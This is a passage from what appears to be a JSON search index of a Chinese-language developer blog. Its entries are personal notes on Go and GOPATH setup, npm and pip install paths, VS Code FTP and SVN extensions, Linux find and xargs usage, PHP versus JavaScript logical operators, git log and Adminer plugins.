ONLY_FULL_GROUP_BY,STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_ENGINE_SUBSTITUTION ","date":"2018-08-28","objectID":"/blog/posts/MySQL%E5%9C%A8Linux%E4%B8%8B%E9%A0%90%E8%A8%AD%E6%9C%89%E5%88%86%E5%A4%A7%E5%B0%8F%E5%AF%AB%E5%92%8CIncorrect-integer-value-for-column-num-%E5%95%8F%E9%A1%8C/:3:0","tags":["MySQL"],"title":"MySQL在Linux下預設有分大小寫和Incorrect integer value: '' for column 'num' 問題","uri":"/blog/posts/MySQL%E5%9C%A8Linux%E4%B8%8B%E9%A0%90%E8%A8%AD%E6%9C%89%E5%88%86%E5%A4%A7%E5%B0%8F%E5%AF%AB%E5%92%8CIncorrect-integer-value-for-column-num-%E5%95%8F%E9%A1%8C/"},{"categories":["GO"],"content":"最近想玩玩看GO 在ElementaryOS安裝GO 踩幾個雷，紀錄一下筆記 這次的雷還深深了解以前code設定環境變數用途 ","date":"2018-08-27","objectID":"/blog/posts/go%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98-gopath%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/:0:0","tags":["go"],"title":"go安裝筆記\u0026gopath環境變數設定","uri":"/blog/posts/go%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98-gopath%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/"},{"categories":["GO"],"content":"apt-get 安裝GO 我比較懶，所以選擇這個方式安裝 用apt-get install golang-go 安裝完你會發現版本太舊 有些需要1.8版以上才能跑 apt-get install golang-1.10-go 記得這邊要加PATH環境變數 export PATH=\"$PATH:/usr/lib/go-1.10/bin bash加在~/.profile或~/.bashrc zsh加在.zshrc 之後有一篇會再講 參考來源 Ubuntu · golang/go Wiki ","date":"2018-08-27","objectID":"/blog/posts/go%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98-gopath%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/:1:0","tags":["go"],"title":"go安裝筆記\u0026gopath環境變數設定","uri":"/blog/posts/go%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98-gopath%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/"},{"categories":["GO"],"content":"GOPATH 沒有權限使用，可以改這個環境變數 Go 1.8 is introducing a default GOPATH. If you don’t set one, the tools will use the default. Default GOPATH is: $HOME/go on Unix-like systems %USERPROFILE%\\go on Windows The default GOPATH · Go, the unwritten parts 原本以為會遇到這個問題 還有GOROOT可以設定GO目錄 不過我沒設定好像也能跑 所以就沒設定 詳細一些東西可以看裡面東西 go环境变量配置 (GOROOT和GOPATH) - 简书 ","date":"2018-08-27","objectID":"/blog/posts/go%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98-gopath%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/:2:0","tags":["go"],"title":"go安裝筆記\u0026gopath環境變數設定","uri":"/blog/posts/go%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98-gopath%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/"},{"categories":["GO"],"content":"其他程式語言兩三事 等等…，為什麼GOPATH就能解決權限問題 那…php,nodejs,沒有一樣設定的東西嗎 ","date":"2018-08-27","objectID":"/blog/posts/go%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98-gopath%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/:3:0","tags":["go"],"title":"go安裝筆記\u0026gopath環境變數設定","uri":"/blog/posts/go%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98-gopath%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/"},{"categories":["GO"],"content":"java classpath 印象中…可以在環境變數先加classpath 不過這應該跟我們這篇沒關係 先跳過 ","date":"2018-08-27","objectID":"/blog/posts/go%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98-gopath%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/:3:1","tags":["go"],"title":"go安裝筆記\u0026gopath環境變數設定","uri":"/blog/posts/go%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98-gopath%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/"},{"categories":["GO"],"content":"nodejs 設定套件golbal存放位置 npm config get prefix 可以抓到現在npm install xxxx -g存放路徑 Linux預設存放 /usr/ C:\\Users\\(User)\\AppData\\Roaming\\npm 這邊我就很好奇，為什麼Linux可以執行nodeglobal為什麼可以在cmd上面打 原來那些路徑有設定到PATH LINUX會在/usr/bin加程式位置 所以你可以打指令執行 所以你自訂npm config set prefix ~/.npm-package 加完不要高興太早記得要在$PATH加入你npm設定位置 不然cmd呼叫不到 The Will Will Web | 如何在 Windows 平台變更 Node.js / npm 全域模組的預設安裝路徑 npm install --prefix \u003cpath/to/prefix_folder\u003e -g好像能指定目錄安裝 npm install –prefix: still available? · Issue #11007 · npm/npm node.js - How to npm install to a specified directory? - Stack Overflow 更詳細介紹npm的.npmrc文件在哪里？缓存及全局包文件在什么位置？ 原來更改這些設定會寫入到~/.npmrc裡面 ","date":"2018-08-27","objectID":"/blog/posts/go%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98-gopath%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/:3:2","tags":["go"],"title":"go安裝筆記\u0026gopath環境變數設定","uri":"/blog/posts/go%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98-gopath%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/"},{"categories":["GO"],"content":"php - composer global 執行路徑會在composer 本目錄下 我沒有用過 先筆記 php - Change composer global path (Windows) - Stack Overflow php - Where to find composer’s global packages? - Stack Overflow ","date":"2018-08-27","objectID":"/blog/posts/go%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98-gopath%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/:3:3","tags":["go"],"title":"go安裝筆記\u0026gopath環境變數設定","uri":"/blog/posts/go%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98-gopath%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/"},{"categories":["GO"],"content":"python pip 這個就爬得很久… apt-get預設安裝在root上面 所以很大機率pip安裝都要加root python自定义安装python包－pip的使用-Bluesky’s blog 用户目录下面，.pip目录下建立pip.conf文件，文件内容如下： [install] install-option=–prefix=~/.local 然后pip的库就安装到用户目录下的.local下面了 python自定义安装python包－pip的使用-Bluesky’s blog 這就沒有測試了…，奇怪這篇重點好像是GO 怎麼扯到別的程式語言呢XD 最後最近玩GO 他的package跟別的程式語言差好多 看來有空還是簡單記一下 從 PHP 到 Golang 的筆記 ","date":"2018-08-27","objectID":"/blog/posts/go%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98-gopath%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/:3:4","tags":["go"],"title":"go安裝筆記\u0026gopath環境變數設定","uri":"/blog/posts/go%E5%AE%89%E8%A3%9D%E7%AD%86%E8%A8%98-gopath%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8%E8%A8%AD%E5%AE%9A/"},{"categories":["Linux"],"content":"To change font in the Terminal you need dconf-editor. Install it, if you haven’t done so: sudo apt-get install dconf-tools Run it and go to path org \u003e gnome \u003e desktop \u003e interface \u003e monospace-font-name. FB themes - How can I change the default Terminal font? - elementary OS Stack Exchange .zshrc 下面修改环境变量，将~/.composer/vendor/bin写入 PATH 环境变量里。 注意： 如果你的命令行安装了zsh和oh-my-zsh，修改环境变量时有些小的变化。 我遇到的就是这个问题，怎么修改，环境变量都不生效，比如我修改的是~/.bash_profile，那么必须`source ~/.bash_profile`才能生效，而且重启后继续无效，为什么呢？因为 zsh ！我的终端是 iTerm2，它很炫酷，但是就是环境变量搞不成。Google 找到了问题所在，安装 zsh 后，~/.bash_profile并没有被执行，所以需要编辑 zsh 的配置文件~/.zshrc，在该文件里加入 source ~/.bash_profile 现在我们应该可以用homestead命令了。 https://segmentfault.com/q/1010000004376181/a-1020000004377872 發現這篇很久沒補 就先寫重點吧… ","date":"2018-08-26","objectID":"/blog/posts/elementary-OS%E6%9B%B4%E6%8F%9BTerminal%E5%AD%97%E5%BD%A2-%E8%A8%AD%E5%AE%9Azsh%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8/:0:0","tags":["Linux"],"title":"elementary OS更換Terminal字形 \u0026 設定zsh環境變數","uri":"/blog/posts/elementary-OS%E6%9B%B4%E6%8F%9BTerminal%E5%AD%97%E5%BD%A2-%E8%A8%AD%E5%AE%9Azsh%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8/"},{"categories":["維修小記"],"content":"公司電腦桌面新增檔案，畫面不會即時… 網路找都找不到是什麼問題? 最後找到這一篇資料夾怪怪的,不能即時更新 - 其他應用軟體 - 電腦討論區 - Mobile01 這個問題發生很久了. 想說爬文解決.結果爬到這篇. 不過昨天試了一個方法. 可以解決此問題. 1.開 C 槽 2.組合管理 - 資料夾搜尋選項 進去後. 全部還原成預設值. 就好了. 每個槽都要做一次. 因為我全部都做了.來不及比對差在那裡 如果大家試有效.可以幫忙比對一下. 是那個選項造成的. 真的有用，筆記筆記 ","date":"2018-08-22","objectID":"/blog/posts/window%E6%A1%8C%E9%9D%A2%E6%96%B0%E5%A2%9E%E6%AA%94%E6%A1%88-%E8%B3%87%E6%96%99%E5%A4%BE%E7%95%AB%E9%9D%A2%E4%B8%8D%E6%9C%83%E5%8D%B3%E6%99%82%E6%9B%B4%E5%8B%95/:0:0","tags":["windows"],"title":"window桌面新增檔案/資料夾，畫面不會即時更動","uri":"/blog/posts/window%E6%A1%8C%E9%9D%A2%E6%96%B0%E5%A2%9E%E6%AA%94%E6%A1%88-%E8%B3%87%E6%96%99%E5%A4%BE%E7%95%AB%E9%9D%A2%E4%B8%8D%E6%9C%83%E5%8D%B3%E6%99%82%E6%9B%B4%E5%8B%95/"},{"categories":["實用工具"],"content":"Sublime Text 有一個很好用sftp套件 但最近換到vscode 很缺一個方便看ftp 嘗試了3個ftp套件 ftp-kr - Visual Studio Marketplace ftp-simple - Visual Studio Marketplace sftp - Visual Studio Marketplace 有稍微網路爬一下Visual Studio Code几款FTP插件使用总结 - 我的笔记 - SegmentFault 思否 好像沒有好用套件 我也沒有需要本地端通部上傳到ftp 希望手動上傳 ","date":"2018-08-20","objectID":"/blog/posts/vscode%E5%98%97%E8%A9%A6%E4%BD%BF%E7%94%A8ftp%E5%A5%97%E4%BB%B6%E5%BF%83%E5%BE%97/:0:0","tags":["vscode","sftp","ftp"],"title":"vscode嘗試使用ftp套件心得","uri":"/blog/posts/vscode%E5%98%97%E8%A9%A6%E4%BD%BF%E7%94%A8ftp%E5%A5%97%E4%BB%B6%E5%BF%83%E5%BE%97/"},{"categories":["實用工具"],"content":"ftp-kr - Visual Studio Marketplace 網路上看到人家推的 基本ftp好像不錯用 不過上傳會一直跳出提示視窗(不會自動關掉…) 這點我還滿不喜歡 不過可以設定多個帳號也不錯 ![Explorer\"](./vscode_ftp_kr.gif “Remote) ","date":"2018-08-20","objectID":"/blog/posts/vscode%E5%98%97%E8%A9%A6%E4%BD%BF%E7%94%A8ftp%E5%A5%97%E4%BB%B6%E5%BF%83%E5%BE%97/:1:0","tags":["vscode","sftp","ftp"],"title":"vscode嘗試使用ftp套件心得","uri":"/blog/posts/vscode%E5%98%97%E8%A9%A6%E4%BD%BF%E7%94%A8ftp%E5%A5%97%E4%BB%B6%E5%BF%83%E5%BE%97/"},{"categories":["實用工具"],"content":"ftp-simple - Visual Studio Marketplace 也上網路上看到的 好像有看到有一篇說很像Sublime Text 的sftp套件，但是我覺得不像…. 不過他有一個特點，上傳模式都是手動上傳 額且上傳本地端檔案名稱可以上傳ftp上面不一樣的檔名 這還有點神奇 假如喜歡手動設定多樣需求 這個一定很好用 ","date":"2018-08-20","objectID":"/blog/posts/vscode%E5%98%97%E8%A9%A6%E4%BD%BF%E7%94%A8ftp%E5%A5%97%E4%BB%B6%E5%BF%83%E5%BE%97/:2:0","tags":["vscode","sftp","ftp"],"title":"vscode嘗試使用ftp套件心得","uri":"/blog/posts/vscode%E5%98%97%E8%A9%A6%E4%BD%BF%E7%94%A8ftp%E5%A5%97%E4%BB%B6%E5%BF%83%E5%BE%97/"},{"categories":["實用工具"],"content":"sftp - Visual Studio Marketplace 接下來這一套是往自己搜尋到的 vscode預設搜尋好像照星星數排的 但是ftp @sort:installs搜尋下載數最高是這個 嘗試結果，看到有ftp diff功能，這個功能我覺得還滿好用的 基本上傳也不會跟ftp-kr - Visual Studio Marketplace彈出東西 而且有一個Remote Explorer 可以不用再開filezilla看了XD ![Explorer”](./remote-explorer.png “Remote) ","date":"2018-08-20","objectID":"/blog/posts/vscode%E5%98%97%E8%A9%A6%E4%BD%BF%E7%94%A8ftp%E5%A5%97%E4%BB%B6%E5%BF%83%E5%BE%97/:3:0","tags":["vscode","sftp","ftp"],"title":"vscode嘗試使用ftp套件心得","uri":"/blog/posts/vscode%E5%98%97%E8%A9%A6%E4%BD%BF%E7%94%A8ftp%E5%A5%97%E4%BB%B6%E5%BF%83%E5%BE%97/"},{"categories":["實用工具"],"content":"心得感想 其實這三套嚴格說都不差 目前個人排名 sftp \u003e ftp-simple \u003e ftp-kr ","date":"2018-08-20","objectID":"/blog/posts/vscode%E5%98%97%E8%A9%A6%E4%BD%BF%E7%94%A8ftp%E5%A5%97%E4%BB%B6%E5%BF%83%E5%BE%97/:4:0","tags":["vscode","sftp","ftp"],"title":"vscode嘗試使用ftp套件心得","uri":"/blog/posts/vscode%E5%98%97%E8%A9%A6%E4%BD%BF%E7%94%A8ftp%E5%A5%97%E4%BB%B6%E5%BF%83%E5%BE%97/"},{"categories":["實用工具"],"content":"由於公司舊專案都是用SVN去開發的 但最近…接觸的案子都是舊專案 平常看這次修改差異都要切到TortoiseSVN 但今天鼓起勇氣嘗試SVN - Visual Studio Marketplace 在此做個筆記 If you use TortoiseSVN, make sure the option Command Line Tools is checked during installation and C:\\Program Files\\TortoiseSVN\\bin is available in PATH. 想說我安裝目錄也在相同路徑，環境變數也有設定PATH 就直接安裝，裝完重啟竟然跑出沒有SVN訊息…. 覺得怪怪的，有趣命令提示字元打svn，沒有反應 在想是不是沒安裝command line東西，試著重新安裝 果然有command line選項 然後vscode操作svn版本操作介面跟git一樣 只能說vscode太神了 我所有編輯器都混著用 從Sublime Text70% 到vscode 30% 現在到vscode 80%到Sublime Text 20% 不過大量文字編輯我還是習慣用Sublime Text SVN Gutter - Visual Studio Marketplace 好像類似gitlens東西 不過有空再試驗看看 ","date":"2018-08-20","objectID":"/blog/posts/vscode%E4%BD%BF%E7%94%A8svn%E5%81%9A%E7%89%88%E6%8E%A7%E7%B0%A1%E5%96%AE%E7%AD%86%E8%A8%98/:0:0","tags":["svn","vscode"],"title":"vscode使用svn做版控簡單筆記","uri":"/blog/posts/vscode%E4%BD%BF%E7%94%A8svn%E5%81%9A%E7%89%88%E6%8E%A7%E7%B0%A1%E5%96%AE%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"最近做find . -mmin -60 | ls -l 發現怎麼不能讀ls內容 原來我以為 |pipe 就是把輸出結果加到後面去 但是並非跟\u003c,\u003c\u003c一樣 所以我在stackoverflow找到linux - Unix pipe into ls - Stack Overflow 要使用xargs 不過我真的對這個不太熟 相關資料流重新導向可以看鳥哥的 Linux 私房菜 – 第十章、認識與學習BASH 上面連結備份圖 xargs網路有爬到Linux 系統 xargs 指令範例與教學 - G. T. Wang講解非常清楚 這邊我就簡單紀錄看起來很常用的指令 xargs 在指令輸入 可以接著輸入很多東西 a b c def 再按Ctrl+d可以看到螢幕輸出a b c def ","date":"2018-08-18","objectID":"/blog/posts/xargs-%E5%8F%83%E6%95%B8%E4%BB%A3%E6%8F%9B%E7%B0%A1%E5%96%AE%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/:0:0","tags":["linux","xargs"],"title":"xargs 參數代換簡單使用筆記","uri":"/blog/posts/xargs-%E5%8F%83%E6%95%B8%E4%BB%A3%E6%8F%9B%E7%B0%A1%E5%96%AE%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"xargs簡單小試 xargs ls 再輸入. 再按下Ctrl+D 可以跳出 所以我們find . -mmin -60 | ls -l 這段 要改成find . -mmin -60 | xargs ls -l ","date":"2018-08-18","objectID":"/blog/posts/xargs-%E5%8F%83%E6%95%B8%E4%BB%A3%E6%8F%9B%E7%B0%A1%E5%96%AE%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/:1:0","tags":["linux","xargs"],"title":"xargs 參數代換簡單使用筆記","uri":"/blog/posts/xargs-%E5%8F%83%E6%95%B8%E4%BB%A3%E6%8F%9B%E7%B0%A1%E5%96%AE%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"執行前的確認 -p會問要不要執行這個參數 echo a b c d e f| xargs -p ","date":"2018-08-18","objectID":"/blog/posts/xargs-%E5%8F%83%E6%95%B8%E4%BB%A3%E6%8F%9B%E7%B0%A1%E5%96%AE%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/:2:0","tags":["linux","xargs"],"title":"xargs 參數代換簡單使用筆記","uri":"/blog/posts/xargs-%E5%8F%83%E6%95%B8%E4%BB%A3%E6%8F%9B%E7%B0%A1%E5%96%AE%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"實用指令 參考Linux 系統 xargs 指令範例與教學 - G. T. Wang find . -name '*.c' | xargs grep 'stdlib.h' 輸出結果 ./CMake/TestOggTheoraSubsampling.c:#include \u003cstdlib.h\u003e ./Wrapping/Tools/lex.yy.c:#include \u003cstdlib.h\u003e ./Wrapping/Tools/vtkWrapPythonInit.c:#include \u003cstdlib.h\u003e ./Wrapping/Tools/vtkWrapTcl.c:#include \u003cstdlib.h\u003e ./Wrapping/Tools/vtkWrapTclInit.c:#include \u003cstdlib.h\u003e ./Wrapping/Tools/vtkParsePreprocess.c:#include \u003cstdlib.h\u003e ./Wrapping/Tools/vtkWrapText.c:#include \u003cstdlib.h\u003e ./Wrapping/Tools/vtkParseData.c:#include \u003cstdlib.h\u003e ./Wrapping/Tools/vtkParseHierarchy.c:#include \u003cstdlib.h\u003e ./Wrapping/Tools/vtkParseMain.c:#include \u003cstdlib.h\u003e 這個指令感覺很實用 ","date":"2018-08-18","objectID":"/blog/posts/xargs-%E5%8F%83%E6%95%B8%E4%BB%A3%E6%8F%9B%E7%B0%A1%E5%96%AE%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/:3:0","tags":["linux","xargs"],"title":"xargs 參數代換簡單使用筆記","uri":"/blog/posts/xargs-%E5%8F%83%E6%95%B8%E4%BB%A3%E6%8F%9B%E7%B0%A1%E5%96%AE%E4%BD%BF%E7%94%A8%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"最近看同事用find搜尋異動檔案指令 真的很方便 不用ls -l看了老半天 這真的太好用了 筆記筆記 以下筆記是參考 Unix/Linux 的 find 指令使用教學、技巧與範例整理 - G. T. Wang 備份圖 Unix/Linux 的 find 指令使用教學、技巧與範例整理 - G. T. Wang ","date":"2018-08-18","objectID":"/blog/posts/Linux-find-%E5%AF%A6%E7%94%A8%E6%8C%87%E4%BB%A4%E7%AD%86%E8%A8%98/:0:0","tags":["linux","find"],"title":"Linux find 實用指令筆記","uri":"/blog/posts/Linux-find-%E5%AF%A6%E7%94%A8%E6%8C%87%E4%BB%A4%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"-mmin(實用) find . -mmin -5 查詢現在異動時間5分鐘的檔案 這招很實用 尤其跑程式，查詢有異動那些檔案 真的很方便ˇ ","date":"2018-08-18","objectID":"/blog/posts/Linux-find-%E5%AF%A6%E7%94%A8%E6%8C%87%E4%BB%A4%E7%AD%86%E8%A8%98/:1:0","tags":["linux","find"],"title":"Linux find 實用指令筆記","uri":"/blog/posts/Linux-find-%E5%AF%A6%E7%94%A8%E6%8C%87%E4%BB%A4%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"-type - type {xx}找檔案類型 找檔案-f 找資料夾 -d ","date":"2018-08-18","objectID":"/blog/posts/Linux-find-%E5%AF%A6%E7%94%A8%E6%8C%87%E4%BB%A4%E7%AD%86%E8%A8%98/:2:0","tags":["linux","find"],"title":"Linux find 實用指令筆記","uri":"/blog/posts/Linux-find-%E5%AF%A6%E7%94%A8%E6%8C%87%E4%BB%A4%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"-size -size 100M剛好100MB -size +50M大於50MB -size -50M小於50MB ","date":"2018-08-18","objectID":"/blog/posts/Linux-find-%E5%AF%A6%E7%94%A8%E6%8C%87%E4%BB%A4%E7%AD%86%E8%A8%98/:3:0","tags":["linux","find"],"title":"Linux find 實用指令筆記","uri":"/blog/posts/Linux-find-%E5%AF%A6%E7%94%A8%E6%8C%87%E4%BB%A4%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"-perm xxx 搜尋權限 -perm 777 ","date":"2018-08-18","objectID":"/blog/posts/Linux-find-%E5%AF%A6%E7%94%A8%E6%8C%87%E4%BB%A4%E7%AD%86%E8%A8%98/:4:0","tags":["linux","find"],"title":"Linux find 實用指令筆記","uri":"/blog/posts/Linux-find-%E5%AF%A6%E7%94%A8%E6%8C%87%E4%BB%A4%E7%AD%86%E8%A8%98/"},{"categories":["Linux"],"content":"-empty 如果要找尋空檔案，可以使用 -empty 參數： find . -type f -empty 找尋空目錄： find . -type d -empty 參考來源: Unix/Linux 的 find 指令使用教學、技巧與範例整理 - G. T. Wang ","date":"2018-08-18","objectID":"/blog/posts/Linux-find-%E5%AF%A6%E7%94%A8%E6%8C%87%E4%BB%A4%E7%AD%86%E8%A8%98/:5:0","tags":["linux","find"],"title":"Linux find 實用指令筆記","uri":"/blog/posts/Linux-find-%E5%AF%A6%E7%94%A8%E6%8C%87%E4%BB%A4%E7%AD%86%E8%A8%98/"},{"categories":["PHP"],"content":"PHP和JavaScript同樣兩個都是軟型態 大同小異，但做這個Logical Operators結果不一樣 最近不小心在PHP寫出一個bug 被同事抓到了 同一個雷不要在踩 ","date":"2018-08-18","objectID":"/blog/posts/Hello-World-%E5%9C%A8PHP%E8%88%87-JavaScript%E7%A8%8B%E5%BC%8FLogical-Operators%E5%B7%AE%E7%95%B0/:0:0","tags":["javascript","PHP","Logical operators"],"title":"'Hello World' || '' 在PHP與 JavaScript程式Logical Operators差異","uri":"/blog/posts/Hello-World-%E5%9C%A8PHP%E8%88%87-JavaScript%E7%A8%8B%E5%BC%8FLogical-Operators%E5%B7%AE%E7%95%B0/"},{"categories":["PHP"],"content":"PHP PHP一定回傳boolean $a = 0 || 'avacado'; print \"A: $a\\n\"; will print: A: 1 ![Operators\"](./php_lo.png “PHP Logical) PHP: Logical Operators - Manual ","date":"2018-08-18","objectID":"/blog/posts/Hello-World-%E5%9C%A8PHP%E8%88%87-JavaScript%E7%A8%8B%E5%BC%8FLogical-Operators%E5%B7%AE%E7%95%B0/:1:0","tags":["javascript","PHP","Logical operators"],"title":"'Hello World' || '' 在PHP與 JavaScript程式Logical Operators差異","uri":"/blog/posts/Hello-World-%E5%9C%A8PHP%E8%88%87-JavaScript%E7%A8%8B%E5%BC%8FLogical-Operators%E5%B7%AE%E7%95%B0/"},{"categories":["PHP"],"content":"JavaScript 'ex1'||'ex2'true傳回’ex1’ false 傳噡’ex2' 不過剛看了下面MDN寫的內容 ![Operators”](./js_lo.png “JavaScript Logical) Logical Operators - JavaScript | MDN 還有'ex1'\u0026\u0026 'ex2' true傳回ex2 false傳回ex1 大部份比較常在JS看到 ||，但是\u0026\u0026真的比較少看到 ","date":"2018-08-18","objectID":"/blog/posts/Hello-World-%E5%9C%A8PHP%E8%88%87-JavaScript%E7%A8%8B%E5%BC%8FLogical-Operators%E5%B7%AE%E7%95%B0/:2:0","tags":["javascript","PHP","Logical operators"],"title":"'Hello World' || '' 在PHP與 JavaScript程式Logical Operators差異","uri":"/blog/posts/Hello-World-%E5%9C%A8PHP%E8%88%87-JavaScript%E7%A8%8B%E5%BC%8FLogical-Operators%E5%B7%AE%E7%95%B0/"},{"categories":["Git"],"content":"最近學會使用git log 但怕很久沒用就會忘了 簡單記錄一下 Git branch(分支)是一個pointer概念 通常習慣用gitk看分支圖片 再不會可以用TortoiseGit和sourcetree 在下兩個都不排斥 但是sourcetree安裝時候要登入帳號密碼 所以我沒有在公司用了 但今天不是要講gui界面多好用 你會看git log --graph --oneline 就可以省略看GUI界面 平常在分之底下看git log，一開始覺得奇怪怎麼不顯示全部分支 事後懂了git branch是一個pointer概念 覺得看全部真的沒有意義(應該正常需求不會看到) 全部看到會覺得太亂 通常在這條分支看過去紀錄，反正merge過後git log都看到 真的沒必要多個--all PS:看圖--graph --oneline顯示一行，英文就是one line和在一起 -p -(n)秀diff 程式碼 $ git log -p -2 最常用的選項之一為 -p，用來顯示每個更新之間差別的內容。 另外還可以加上 -2 參數，限制為只輸出最後兩個更新。 通常也不用死記 git bashtab 可以自動autocomplete (工程師沒辦法記太多東西\u003e.\u003c) 剛開始看不是很懂git log全部分支 但自從懂git branch是pointer概念 就開竅了XDD 參考來源: Git - 檢視提交的歷史記錄 ","date":"2018-08-17","objectID":"/blog/posts/git-log%E7%B0%A1%E5%96%AE%E7%94%A8%E6%B3%95%E7%AD%86%E8%A8%98/:0:0","tags":["git","log"],"title":"git log簡單用法筆記","uri":"/blog/posts/git-log%E7%B0%A1%E5%96%AE%E7%94%A8%E6%B3%95%E7%AD%86%E8%A8%98/"},{"categories":["PHP"],"content":"這篇記錄adminer要怎麼裝套件，步驟真的不複雜 簡單記一下 首先我需要一個table欄位置頂功能 我看我plugin都沒有 (沒有當然自幹XDD)) 裝上[stylus]](https://addons.mozilla.org/zh-TW/firefox/addon/styl-us/) 設定 table{ border-collapse: separate; } table td,table th{ border-color: rgba(153, 153, 153,.7) } table thead { position: sticky; top: 0px; } 其實簡單用到sticky 發現sticky要在table為spearate才有用… 但是sparate真的很難看 原本想用小border 但發現border沒辦法縮的比1px還小 CSS border less than 1px - Stack Overflow 這其實可以獨立寫一篇XD 最後參照stack overflow設定透明度 有看得比較順眼 參考來源 CSS border less than 1px - Stack Overflow CSS border-collapse 属性 CSS border-spacing 属性 css - Why border is not visible with “position: sticky” when background-color exists? - Stack Overflow 等等，還沒介紹adminer 可以先新增一個資料夾 把adminer放裡面，再把順眼的adminer plugin抓下來 推薦struct-comments 設定一個index.php 使用套件教學 \u003c?php function adminer_object() { // required to run any plugin include_once \"./plugins/plugin.php\"; // autoloader foreach (glob(\"plugins/*.php\") as $filename) { include_once \"./$filename\"; } $plugins = array( // specify enabled plugins here new AdminerDumpXml, new AdminerTinymce, new AdminerFileUpload(\"data/\"), new AdminerSlugify, new AdminerTranslation, new AdminerForeignSystem, ); /* It is possible to combine customization and plugins: class AdminerCustomization extends AdminerPlugin { } return new AdminerCustomization($plugins); */ return new AdminerPlugin($plugins); } // include original Adminer or Adminer Editor include \"./adminer.php\"; ?\u003e PHP: glob - Manual 算是很神的method 可以用神奇的方法抓到想要的檔案 自動載入也可以參考__autoload 當然也可以直接去github找人家用好的adminer版本 dg/adminer-custom: Customizations for Adminer, the best database management tool written in PHP. 不過我還是覺得原版看比較順眼 ","date":"2018-08-17","objectID":"/blog/posts/adminer-%E7%AE%A1%E7%90%86DB%E5%B7%A5%E4%BD%9C%E8%A3%9D%E5%A5%97%E4%BB%B6%E8%A8%98%E9%8C%84/:0:0","tags":["adminer"],"title":"adminer 管理DB工作裝套件記錄","uri":"/blog/posts/adminer-%E7%AE%A1%E7%90%86DB%E5%B7%A5%E4%BD%9C%E8%A3%9D%E5%A5%97%E4%BB%B6%E8%A8%98%E9%8C%84/"},{"categories":["jQuery"],"content":"之前我很常在大學自學 jQuery 很常用$('xxx').serialize()做表單傳送動作 不過今天上班同事剛好問 form 就看到這個$.param(xxxx,true) 好奇這個跟serialize哪裡不一樣 這篇當然要好好補足一下 PHP 使用上可能需要用到$.param 網路查了一下 常看到這三個 method 做比較$.serialize、$.serializeArray和$.param ","date":"2018-08-17","objectID":"/blog/posts/jQuery-param%E5%82%B3%E5%8F%83%E6%95%B8%E5%B0%8F%E7%AD%86%E8%A8%98/:0:0","tags":["jQuery","param","form"],"title":"jQuery $.param傳參數小筆記","uri":"/blog/posts/jQuery-param%E5%82%B3%E5%8F%83%E6%95%B8%E5%B0%8F%E7%AD%86%E8%A8%98/"},{"categories":["jQuery"],"content":"$(“form”).serialize() 基於$.param實作 寫$.ajax 很常用到這個 其實這個跟$.param沒有什麼重要關係 ","date":"2018-08-17","objectID":"/blog/posts/jQuery-param%E5%82%B3%E5%8F%83%E6%95%B8%E5%B0%8F%E7%AD%86%E8%A8%98/:1:0","tags":["jQuery","param","form"],"title":"jQuery 